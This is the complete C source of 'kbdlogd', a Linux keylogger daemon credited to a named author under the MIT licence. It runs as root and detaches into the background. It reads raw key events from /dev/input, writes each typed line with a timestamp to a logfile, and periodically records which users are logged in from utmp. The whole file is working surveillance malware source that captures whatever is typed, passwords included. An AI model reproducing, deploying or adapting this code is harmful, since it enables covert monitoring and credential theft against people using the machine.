/**
 * kbdlogd.c - A simple keylogger that uses /dev/input/*.
 * Federico Fazzi <eurialo@deftcode.ninja>
 *
 * 2006 - MIT License.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <getopt.h>
#include <fcntl.h>
#include <linux/input.h>
#include <utmp.h>
#include <time.h>
#include <signal.h>
#include <syslog.h>
#include <pthread.h>
#include "kbdlogd.h"

// Prototypes.
void end_sig(int signum);
void kbdlogd_s(void);
void *update();
void users(void);
void puts_debug(char *str, int type);
void puts_syslog(char *str);
void usage(void);

// Globals.
FILE *lfd, *fdpid;
static int version_flag;
static int help_flag;
char device[128];
char outfd[128];
char vbuf[128];
int debug_flag = 1;
int update_flag = 1;
int update_time;

void main (int argc, char **argv) {
    int c, fd;
    int option_index = 0;

    pid_t pid;
    uid_t uid;
    gid_t gid;

    memset(device, 0, sizeof(device));
    memset(outfd, 0, sizeof(outfd));
    memset(vbuf, 0, sizeof(vbuf));

    while (true) {
        // Struct of array arguments.
        static struct option long_options[] =
        {
            {"version",  no_argument,       &version_flag,   1},
            {"nversion", no_argument,       &version_flag,   0},
            {"debug",    no_argument,       0,             'd'},
            {"device",   required_argument, 0,             'i'},
            {"outfile",  required_argument, 0,             'o'},
            {"update",   required_argument, 0,             'u'},
            {"help",     no_argument,       &help_flag,      1},
            {"nhelp",    no_argument,       &help_flag,      0},
            {0,          0,                 0,               0}
        };

        c = getopt_long(argc, argv, "do:i:u:", long_options, &option_index);
        if (c == -1) break;
    
        switch (c) {
            case 0:
                if (long_options[option_index].flag != 0)
                    break;

                printf("option %s", long_options[option_index].name);
                if (optarg) printf(" with arg %s", optarg);
                printf("\n");
                break;
            case 'd':
                // Enable debug mode.
                debug_flag = 0;
                break;
            case 'i':
                snprintf(device, sizeof(device) - 1, "%s", optarg);
                break;
            case 'o':
                // Set alternate logfile.
                snprintf(outfd, sizeof(outfd) - 1, "%s", optarg);
                break;
            case 'u':
                // Set the time update of
                // the alive PTS(s).
                update_flag = 0;
                update_time = (int)atoi(optarg);
            case '?':
                break;
            default:
                abort();
        }
    }

    // Print the version.
    if (version_flag) {
        snprintf(vbuf, (50 + strlen(KBDL_NAME) + strlen(KBDL_VERS)), 
            "%s version %s.\n", KBDL_NAME, KBDL_VERS);

        printf("%s", vbuf);
        exit(EXIT_SUCCESS);
    }

    // Print the help message.
    if (help_flag) usage();

    // Check the arguments errors.
    if (optind < argc) {
        printf("Error: non-option ARGV-elements: ");

        while (optind < argc)
            printf("%s ", argv[optind++]);

        putchar('\n');
    }

    // Check for root privileges.
    if ((uid = getuid()) != 0 && (gid = getgid()) != 0) {
        puts("Error: kbdlogd must be run as root!");
        exit(EXIT_FAILURE);
    }

    // Open default or temporary logfile.
    if (strlen(outfd)) lfd = fopen(outfd, "w");
    else lfd = fopen(KBDL_LOG, "w");

    if (lfd == NULL) {
        perror("Error: fopen() - unable to open logfile");
        exit(EXIT_FAILURE);
    }

    // If the 'debug_flag' is set up to '0'
    // start kbdlogd in daemon mode.
    if (debug_flag != 0) {
        pid = fork();

        if (pid < 0) {
            puts("Error: cannot fork a new process.");
            exit(EXIT_FAILURE);
        }
        else if (pid > 0) {
            fdpid = fopen(KBDL_PIDF, "w");
            fprintf(fdpid, "%d\n", pid);
            fclose(fdpid);
            exit(EXIT_SUCCESS);
        }
        else if (pid != 0) 
            _exit(EXIT_SUCCESS);

            if (setsid() == -1) {
                puts("Error: cannot set new session.");
                exit(EXIT_FAILURE);
            }

            fd = open(KBDL_NULL, O_RDWR, 0);
            if (fd != -1) {
                dup2(fd, STDIN_FILENO);
                dup2(fd, STDOUT_FILENO);
                dup2(fd, STDERR_FILENO);
                if (fd > 2) close(fd);
            }
    }

    // Handle the signals.
    signal(SIGINT, end_sig);
    signal(SIGQUIT, end_sig);
    signal(SIGTERM, end_sig);

    // Write to the sys/logfile.
    puts_syslog(KBDL_SYSL_S);
    puts_debug(KBDL_STR_START, 1);
    fprintf(lfd, KBDL_STR_START);
    fflush(lfd);

    // Start a new capture event.
    kbdlogd_s();
}

void end_sig(int signum) {
    fclose(lfd);
    puts_syslog(KBDL_SYSL_E);
    
    if (access(KBDL_PIDF, F_OK) == 0)
        unlink(KBDL_PIDF);

    exit(EXIT_SUCCESS);
}

void kbdlogd_s() {
    int fd, size, keyid, x = -1, c = 0;
    char timebuf[100];
    char *keybuf[255];
    struct input_event ev[1];
    struct tm *ptm;
    time_t tm;
    pthread_t  pthread;

    // Open the device to start capturing data.
    if (strlen(device)) {
        if ((fd = open(device, O_RDONLY)) < 0) {
            printf("%s\n", device);
            perror("Error: open() - unable to open device");
            exit(EXIT_FAILURE);
        }
    }
    else {
        if ((fd = open(KBDL_DEV, O_RDONLY)) < 0) {
            perror("Error: open() - unable to open device");
            exit(EXIT_FAILURE);
        }
    }

    pthread_create(&pthread, NULL, update, NULL);

    while (true) {
        size = read(fd, ev, sizeof(ev));

        if (size < (int) sizeof(struct input_event)) {
            perror("Error: read() - unable to read data from device");
            exit(EXIT_FAILURE);
        }

        if (ev[0].value == 1) {
            keyid = ev[0].code;

            if (keyid == 28) {
                tm = time(NULL);
                ptm = localtime(&tm);
                
                strftime(timebuf, sizeof(timebuf), "%X %x >> ", ptm);
                puts_debug(timebuf, 1);
                
                fprintf(lfd, "%s", timebuf);
                fflush(lfd);
                
                // Replace the keycode number to 
                // keycode character.
                while ((c - 1) != x) {
                    fprintf(lfd, "%s", keybuf[c]);
                    fflush(lfd);
                    puts_debug(keybuf[c], 1);
                    c++;
                }

                fputc('\n', lfd);
                fflush(lfd);
                puts_debug("\n", 1);
                
                x= -1;
                c = 0;
            }

            x++;
            // Save the keycode character 
            // in the keybuffer.
            keybuf[x] = keycode[keyid];
        }
    }
}

void *update() {
    while (true) {
        users();
        if (!update_flag) sleep(update_time);
        else sleep(60);
    }

    pthread_exit(NULL);
}

void users(void) {
    int fd, rd;
    struct utmp ut;
    pid_t pid;

    // Open the /var/run/utmp to 
    // capture the user data.
    fd = open(KBDL_UTMP, O_RDONLY);
    if (fd < 0) { 
        perror("Error: open() - unable to open utmp"); 
        exit(EXIT_FAILURE);
    }

    puts_debug(KBDL_STR_SEP, 1);
    fprintf(lfd, KBDL_STR_SEP);
    fflush(lfd);

    puts_debug(KBDL_STR_USR, 1);
    fprintf(lfd, KBDL_STR_USR);
    fflush(lfd);

    while (true) {
        rd = read(fd, &ut, sizeof(ut));

        if (rd < 0) { 
            perror("Error: read() - unable to read utmp"); 
            exit(EXIT_FAILURE);
        }

        if (rd == 0) break;

        if (ut.ut_type == USER_PROCESS) {
            if (debug_flag == 0) printf("'%s' at '%s'\n", ut.ut_name, ut.ut_id);

            fprintf(lfd, "'%s' at '%s'\n", ut.ut_name, ut.ut_id);
            fflush(lfd);
        }
    }
    
    close(fd);
    
    puts_debug(KBDL_STR_SEP, 1);
    fprintf(lfd, KBDL_STR_SEP);
    fflush(lfd);
}

void puts_debug(char *str, int type) {
    if (debug_flag == 0) {
        if (type == 0) puts(str);
        else printf("%s", str);
    }
}

void puts_syslog(char *str) {
    openlog(KBDL_NAME, LOG_PID, LOG_DAEMON);
    syslog(LOG_NOTICE, "%s", str);
    closelog();
}

void usage(void) {
    puts("usage: kbdlogd [OPTIONS]...\n"
        "Capure keyboard stream data from /dev/input/*\n\n"
        "Avaiable options.\n"
        "  -d, --debug     enable debug mode.\n"
        "  -i, --device    set alternate keyboard device (default: /dev/input/event0).\n"
        "  -o, --outfile   set alternate logfile.\n"
        "  -u, --update    set PTS update time (default: 60secs).\n"
        "      --version   show the keylogger version.\n"
        "      --help      display this help.");

    exit(EXIT_SUCCESS);
}
